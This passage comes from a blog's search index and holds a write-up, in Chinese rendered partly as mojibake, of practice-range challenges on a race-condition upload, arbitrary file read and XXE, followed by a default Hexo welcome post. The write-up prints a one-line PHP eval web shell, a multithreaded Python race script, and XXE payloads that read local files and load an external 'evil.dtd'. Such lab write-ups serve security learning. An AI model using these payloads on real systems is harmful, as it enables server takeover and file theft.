href="#è¿‡ç¨‹-20">#</a> è¿‡ç¨‹ï¼š</h2><p>ç«äº‰çš„åœ°æ–¹ï¼Œæ˜¯å…ˆåˆ é™¤è¿˜æ˜¯å…ˆæ‰§è¡Œï¼Œå…³é”®å°±åœ¨äºèµ¶åœ¨åˆ é™¤ä¹‹å‰æ‰§è¡Œä¸Šä¼ çš„æ–‡ä»¶ã€‚<br>è¿™æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ï¼Œæ–°å»ºä¸€ä¸ª info.php æ–‡ä»¶ï¼Œé‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><figure class="highlight php"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;info.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å¹¶å‘å¯ä»¥å®ç°åœ¨ä¸Šä¼ æˆåŠŸæœªæ‰§è¡Œåˆ°åˆ é™¤ä»£ç çš„æ—¶å€™ï¼Œè®¿é—®æ‰§è¡Œï¼Œç”Ÿæˆ info.phpã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ¶ç±» threading.Thread</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_</span>(<span class="params">self</span>):</span></span><br><span class="line">        threading.Thread._init_(self)</span><br><span class="line">        self.url = <span class="string">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class="comment"># é©¬</span></span><br><span class="line">        self.uploadUrl = <span class="string">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class="comment"># æå®ƒ</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è·å–ä¸Šä¼ çš„é©¬ï¼Œå°±æ˜¯è§£ææ‰§è¡Œ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>: <span class="comment"># æåˆ°æˆåŠŸå°±é€€å‡º</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;create file info.php success.&#x27;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä¼ é©¬</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;upload file...&#x27;</span>)</span><br><span class="line">        file = &#123;<span class="string">&#x27;myfile&#x27;</span> : <span class="built_in">open</span>(<span class="string">&#x27;attack.php&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)&#125; <span class="comment">#key valueçš„æ•°æ®ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯å•¥</span></span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä¸€ç›´æ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># å…¶å®å°±å¤–é¢é‚£ä¸ªå¾ªç¯ä¸å°±å¥½äº†ï¼Œä¸ºå•¥è¿˜è¦å†å†™ä¸€ä¸ªforå•Š</span></span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = <span class="number">50</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">        <span class="comment"># joinçš„åŸç†å°±æ˜¯ä¾æ¬¡æ£€éªŒçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ˜¯å¦ç»“æŸï¼Œæ²¡æœ‰ç»“æŸå°±é˜»å¡ç›´åˆ°çº¿ç¨‹ç»“æŸï¼Œå¦‚æœç»“æŸåˆ™è·³è½¬æ‰§è¡Œä¸‹ä¸€ä¸ªçº¿ç¨‹çš„joinå‡½æ•°ã€‚</span></span><br><span class="line">        t.join() </span><br></pre></td></tr></table></figure><p><img src="dorabox_jz_upload002.png" alt=""></p><h2 id="æ€»ç»“-20"><a class="markdownIt-Anchor" href="#æ€»ç»“-20">#</a> æ€»ç»“ï¼š</h2><p>python çš„ self ç«Ÿç„¶ä¸æ˜¯å…³é”®å­—ï¼Ÿï¼Ÿï¼Ÿæ˜¯å› ä¸º__init__(self) çš„æ—¶å€™åˆ›å»ºäº†ä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹ï¼Œä¸”åå­—å« selfï¼Œæ‰€ä»¥æ¢æˆåˆ«çš„å­—ç¬¦ä¸²ï¼Œåœ¨åˆ«çš„å‡½æ•°é‡Œä¹Ÿèƒ½ç”¨æŠŠã€‚</p><p>python ç±»å˜é‡ï¼Œå®ƒçš„å€¼å°†åœ¨è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹ä¹‹é—´å…±äº«ã€‚ï¼ˆè¿˜æœ‰åœ¨_<em>init</em>_() çš„æ—¶å€™ self. å˜é‡ï¼Œè¿™å’Œ java åŒºåˆ«è¿˜è›®å¤§çš„ï¼‰</p><p>å¿ƒå¾—å°±æ˜¯è§£é¢˜æ€è·¯çœŸçš„å¾ˆé‡è¦ï¼Œå› ä¸ºèœï¼Œéƒ½æ²¡è§è¿‡ï¼Œæ— ä»ä¸‹æ‰‹çš„æ„Ÿè§‰å¤ªéš¾å—äº†ï¼Œæ˜¯ä¸æ˜¯é¢˜ç›®å†™å¤šäº†å°±ä¼šæœ‰å¾ˆå¤šæ€è·¯ï¼Ÿå¸Œæœ›ä¸è¦å†™å¤šäº†é¢˜ç›®æ€ç»´åè€Œè¢«å±€é™äº†ï¼Œè¿˜æ˜¯è¦å¤šæ€è€ƒã€‚</p><p>æœ€åï¼Œè¿™é“é¢˜çœŸçš„å¥½å¸…å•Šï¼ï¼ï¼</p><h1 id="ä»»æ„æ–‡ä»¶è¯»å–"><a class="markdownIt-Anchor" href="#ä»»æ„æ–‡ä»¶è¯»å–">#</a> ä»»æ„æ–‡ä»¶è¯»å–</h1><p>è¾“å…¥â€¦/ï¼Œå‘ç°æ˜¯å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶çš„</p><p><img src="dorabox_readanyfile002.png" alt=""></p><h2 id="è¿‡ç¨‹-21"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-21">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>ç›´æ¥è¯»å–æ–‡ä»¶<img src="dorabox_readanyfile001.png" alt=""></li></ol><h2 id="æ€»ç»“-21"><a class="markdownIt-Anchor" href="#æ€»ç»“-21">#</a> æ€»ç»“ï¼š</h2><p>è¿™ä¸ªï¼Œemmmmï¼Œè¿™æ ·çš„æ¼æ´ï¼Œå¾ˆéš¾æ‰¾æŠŠï¼Ÿï¼ˆå‚»å–µï¼‰</p><h1 id="xxe"><a class="markdownIt-Anchor" href="#xxe">#</a> xxe</h1><p>é¶åœº php å’Œ xml äº¤äº’çš„æ—¶å€™æŠ¥é”™äº†ï¼Œç™¾åº¦æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œæˆ‘å¤ªèœäº†ï¼ˆç°åœ¨ä¹Ÿå¾ˆèœå–”ï½æˆ‘ä»¬å›å®¶æ‘†å°æ‘ŠæŠŠ o (ï¿£Îµï¿£*)ï¼‰</p><p><img src="dorabox_xxe001.png" alt=""></p><h2 id="è¿‡ç¨‹-22"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-22">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>çœ‹å‰ç«¯ä»£ç ï¼Œè§‚å¯Ÿåˆ°æœåŠ¡ç«¯ä»¥ xml çš„å½¢å¼æ¥æ”¶æ–‡ä»¶ï¼Œç„¶åæœåŠ¡å™¨ä¼šæ­£å¸¸è¿”å›å®¢æˆ·ç«¯åœ¨ body ä¸­ post è¿‡å»çš„ xml ä»£ç æ‰§è¡Œç»“æœ</p><p><img src="dorabox_xxe002.png" alt=""></p></li><li><p>æ„é€  xml æ–‡ä»¶è¯»å– attack.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Sakura</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>æ¡œæ¡œç§ã¯ã‚ãªãŸã‚’æ„›ã—ã¦ã„ã¾ã™<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="æ€»ç»“-22"><a class="markdownIt-Anchor" href="#æ€»ç»“-22">#</a> æ€»ç»“ï¼š</h2><p>xxe å°±æ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥å˜›ï¼Œå¯ä»¥ä¸€è¡Œä»£ç ç¦ç”¨ã€‚</p><p>xxe æ˜¯ç”± xml å’Œ dtd çº¦æŸæå‡ºæ¥çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ–‡ä»¶è·¯å¾„å’Œå˜é‡åï¼Œå›æ˜¾æ•°æ®ã€‚</p><p>1ã€ å½“å¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯<strong>æœ¬åœ°æ–‡ä»¶</strong>çš„æ—¶å€™ï¼Œç”¨ SYSTEM æ ‡è¯†ï¼Œå¹¶å†™ä¸Šâ€DTD çš„æ–‡ä»¶è·¯å¾„â€ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot;&gt;</span><br></pre></td></tr></table></figure><p>2ã€ å¦‚æœå¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯ä¸€ä¸ª<strong>å…¬å…±æ–‡ä»¶</strong>æ—¶ï¼Œé‡‡ç”¨ PUBLIC æ ‡è¯†ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;DTDåç§°&quot; &quot;DTDæ–‡ä»¶çš„URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>1. å†…éƒ¨å®ä½“å£°æ˜</strong></p><!ENTITY å®ä½“åç§° "å®ä½“çš„å€¼"> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2. å¤–éƒ¨å®ä½“å£°æ˜</strong></p><!ENTITY å®ä½“åç§° SYSTEM "URI/URL"> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>login<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤ç§å‡ä¸ºå¼•ç”¨å®ä½“ï¼Œä¸»è¦åœ¨<strong> XML æ–‡æ¡£ä¸­</strong>è¢«åº”ç”¨ï¼Œå¼•ç”¨æ–¹å¼ï¼š<strong>&amp; å®ä½“åç§°ï¼›</strong> æœ«å°¾è¦å¸¦ä¸Šåˆ†å·ï¼Œè¿™ä¸ªå¼•ç”¨å°†ç›´æ¥è½¬å˜æˆå®ä½“å†…å®¹ã€‚</p><p><strong>3. å‚æ•°å®ä½“å£°æ˜</strong></p><!ENTITY % å®ä½“åç§° "å®ä½“çš„å€¼"> <!ENTITY % å®ä½“åç§° SYSTEM "URI/URL"> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">body</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>login<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°å®ä½“ï¼Œè¢«<strong> DTD æ–‡ä»¶</strong>è‡ªèº«ä½¿ç”¨ ï¼Œå¼•ç”¨æ–¹å¼ä¸ºï¼š% å®ä½“åç§°ã€‚å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><p>å…è®¸<strong>åŒ…å«å¤–éƒ¨å®ä½“</strong>ï¼Œå°±å¯èƒ½å­˜åœ¨ XXE æ”»å‡»ã€‚</p><p><strong>ã€åˆ©ç”¨ 1ã€‘è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ã€åˆ©ç”¨ 2ã€‘è¯»å–å«ç‰¹æ®Šå­—ç¬¦çš„æœ¬åœ°æ–‡ä»¶</strong></p><p>å¦‚æœæ–‡ä»¶ä¸­å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ &amp;,&lt;,&gt;,&quot;,' ç­‰ï¼Œé€šè¿‡ä¸Šè¿°æ–¹æ³•ä¼šæŠ¥é”™ï¼Œéœ€è¦å€ŸåŠ© CDATAï¼ŒCDATA èŠ‚ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«å½“åšå…ƒç´ å­—ç¬¦æ•°æ®çš„å¸¸é‡éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ xml æ ‡è®°ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="æœ€åå“¦"><a class="markdownIt-Anchor" href="#æœ€åå“¦">#</a> æœ€åå“¦</h1><p>å°å¿ƒçœ¼ + è®°ä»‡ã® milkii0ï¼Œä¼šæ‰“è´¥ä½ ä»¬çš„ï¼</p>]]></content>
      
      
      <categories>
          
          <category> å¤§å†’é™© </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dorabox,é¶åœºç»ƒä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¤è¯†Markdown</title>
      <link href="/2016/04/14/other/hello-world/"/>
      <url>/2016/04/14/other/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start">#</a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post">#</a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server">#</a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files">#</a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites">#</a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
